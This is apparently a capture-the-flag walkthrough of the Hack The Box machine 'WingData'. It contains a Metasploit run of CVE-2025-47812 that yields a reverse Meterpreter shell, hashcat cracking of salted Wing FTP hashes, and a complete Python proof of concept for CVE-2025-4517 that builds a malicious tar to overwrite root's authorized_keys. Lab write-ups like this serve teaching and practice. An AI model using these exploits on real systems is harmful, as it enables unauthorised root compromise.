# 🪶 WingData — HTB Seasonal Box Spoiler

> **Difficulty:** Easy | **OS:** Linux | **Release:** HTB Seasonal

---

## ⚡ TL;DR

Version fingerprint at login page footer → CVE-2025-47812 gives pre-auth RCE via NULL byte Lua injection → Wing FTP salted SHA256 hashes cracked with Hashcat → SSH as `wacky` → CVE-2025-4517 tarfile `PATH_MAX` overflow bypasses `filter="data"` → arbitrary write to `/root/.ssh/authorized_keys` → root.

---

## 🗺️ Attack Path

```
Recon → ftp.wingdata.htb → CVE-2025-47812 (Pre-Auth RCE) → wingftp shell
→ Wing FTP SHA256 hash crack → SSH (wacky / user.txt)
→ sudo python3 restore script → CVE-2025-4517 tarfile filter bypass → root
```

---

## 🔍 Recon

- Ports: **22 (SSH)**, **80 (Apache)**
- HTTP redirects to `wingdata.htb` — a file-sharing landing page
- "Client Portal" button redirects to vhost `ftp.wingdata.htb`
- Login page footer discloses: **Wing FTP Server v7.4.3**
- CVE search for this version surfaces **CVE-2025-47812** (critical pre-auth RCE)

---

## 🌐 Web → Initial Shell

### CVE-2025-47812 — Pre-Auth RCE via NULL Byte Lua Injection

Wing FTP serialises session data as **Lua scripts** instead of a safe format (JSON/binary). The server later executes these files directly via `dofile()`. User-controlled fields like `username` are written into the session file without sanitisation.

The trick is a **C-style NULL byte** (`%00` URL-encoded):

```
Input:  normal_user%00" ; os.execute("cmd") ; --

C validation sees:   "normal_user"   (stops at \0) — passes
File writer writes:  full buffer     (null + payload)
Lua interpreter:     executes everything after \0
```

Resulting session file on disk:
```lua
Session = {
  username = "normal_user\0" ; os.execute("cmd") ; --",
  ip = "...",
}
```

When the server calls `dofile(session_file)`, the injected Lua runs with server privileges.

**Exploit — Metasploit:**
```bash
msfconsole -q
use exploit/multi/http/wingftp_null_byte_rce
set RHOSTS ftp.wingdata.htb
set RPORT 80
set LHOST tun0
set ForceExploit true
run
```

**Result:** Meterpreter session as `wingftp`

---

## 👤 User Flag

### Wing FTP Internal Structure

Installation root: `/opt/wftpserver/`

```
Data/
├── settings.xml              ← global server config (MD5 master password)
├── _ADMINISTRATOR/
│   ├── admins.xml            ← admin hashes (unsalted SHA256 — not crackable)
│   └── settings.xml          ← admin panel on port 5466
└── 1/                        ← Domain 1
    ├── users/*.xml            ← domain user hashes (salted SHA256)
    └── settings.xml           ← password policy
```

### Hash Extraction

From `Data/1/settings.xml`, the password policy reveals:
```xml
<EnableSHA256>1</EnableSHA256>
<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>
```

Hash formula: **`SHA256(password + "WingFTP")`**

Users in `Data/1/users/`: `anonymous`, `john`, `maria`, `steve`, **`wacky`**

`wacky.xml` hash:
```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

### Hash Cracking — Hashcat Mode 1410

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > wing_users.hash
hashcat -m 1410 -a 0 wing_users.hash /path/to/rockyou.txt
```

**Cracked:** `xxx`

```bash
ssh wacky@wingdata.htb   # password: xxx
cat ~/user.txt           # ✅
```

---

## 🔴 Privilege Escalation

### Sudo Entry

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py
```

`wacky` can run the restore script as root with arbitrary arguments.

### Script Analysis

`restore_backup_clients.py` validates both arguments strictly before extracting:

| Argument | Validation | Result |
|---|---|---|
| `-b backup_<N>.tar` | regex `^backup_\d+\.tar$`, client_id ≠ 0 | No path traversal |
| `-r restore_<tag>` | `^[a-zA-Z0-9_]{1,24}$` | No slashes |

Archive source: `/opt/backup_clients/backups/` (writable by `wacky`)  
Extraction target: `/opt/backup_clients/restored_backups/`

The extraction call:
```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

Paths are locked down. The **archive contents**, however, are fully attacker-controlled and receive no semantic validation.

---

### CVE-2025-4517 — Tarfile `realpath()` PATH_MAX Overflow

Python's `filter="data"` uses `os.path.realpath()` to canonicalise member paths and check they stay within the extraction root. The bug: when symlink resolution expands to a path **exceeding `PATH_MAX` (4096 bytes)**, `realpath()` returns an **incomplete, truncated path** silently instead of erroring out. The filter trusts this incomplete result — but the filesystem follows the *actual* full resolution.

**Attack chain inside the malicious tar:**

1. **Build a deep symlink ladder** — 16 levels of long directory names (`'d' * 247` per level), each level also has a short symlink pointing to the long dir. Following the chain expands to ~3968 bytes.

2. **Create the PATH_MAX-busting symlink** — a symlink at `a/b/c/.../p/lll...(254 l's)` pointing back up 16 levels (`../` × 16). `realpath()` can't fully expand this, so the filter sees a short, safe-looking path.

3. **Create `escape`** — a symlink whose `linkname` goes through the long path then appends `/../../../../root/.ssh/authorized_keys`. The filter can't trace where it really leads.

4. **Create `flaglink`** — a **hardlink** to `escape`. Hardlinks in tar extraction mean "same inode" — so once `escape` lands outside the sandbox, `flaglink` points there too.

5. **Write payload to `flaglink`** — a regular file write to the hardlink overwrites the external target file with your public SSH key.

### Exploit Steps

**1. Generate an SSH keypair:**
```bash
ssh-keygen -t ed25519 -f root_key -N ""
```

**2. Build the evil tar** (modified PoC from Google Security Research):
```python
import tarfile, os, io, sys

EVIL_TAR_NAME = "backup_1337.tar"
TRAVERSAL_PATH = "/../../../../root/.ssh/authorized_keys"
WRITE_CONTENT = "ssh-ed25519 AAAA... <your root_key.pub content>"

comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""

with tarfile.open(EVIL_TAR_NAME, mode="x") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)

    linkpath = os.path.join("/".join(steps), "l" * 254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)

    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + TRAVERSAL_PATH
    tar.addfile(e)

    f = tarfile.TarInfo("flaglink")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape"
    tar.addfile(f)

    content = WRITE_CONTENT.encode() + b"\n"
    c = tarfile.TarInfo("flaglink")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))
```

**3. Upload the evil tar:**
```bash
scp backup_1337.tar wacky@wingdata.htb:/opt/backup_clients/backups/
```

**4. Trigger extraction as root:**
```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_1337.tar \
  -r restore_whatever
```

**5. SSH in as root:**
```bash
chmod 600 root_key
ssh -i root_key root@wingdata.htb
cat /root/root.txt   # ✅
```

---

## 📊 Summary Table

| Stage | Technique | CVE / Tool |
|---|---|---|
| Fingerprint | Version disclosure in footer | Wing FTP v7.4.3 |
| Initial Access | NULL byte Lua injection → pre-auth RCE | CVE-2025-47812 |
| Lateral Movement | Salted SHA256 offline crack | Hashcat `-m 1410` |
| Privilege Escalation | tarfile `PATH_MAX` filter bypass → SSH key write | CVE-2025-4517 |

---

## 🔑 Key Takeaways

- **Lua as session storage** is a footgun — data-as-code with user-controlled fields is a classic injection primitive.
- **`filter="data"` isn't magic** — it depends entirely on `os.path.realpath()` being reliable. The `PATH_MAX` edge case proves it isn't.
- **Hardlinks are the write primitive** — symlinks escape the sandbox; hardlinks make the escape persistent and writable.
- **Salted hashes still fall to wordlists** — `WingFTP` as a static salt is public information once you can read config files.
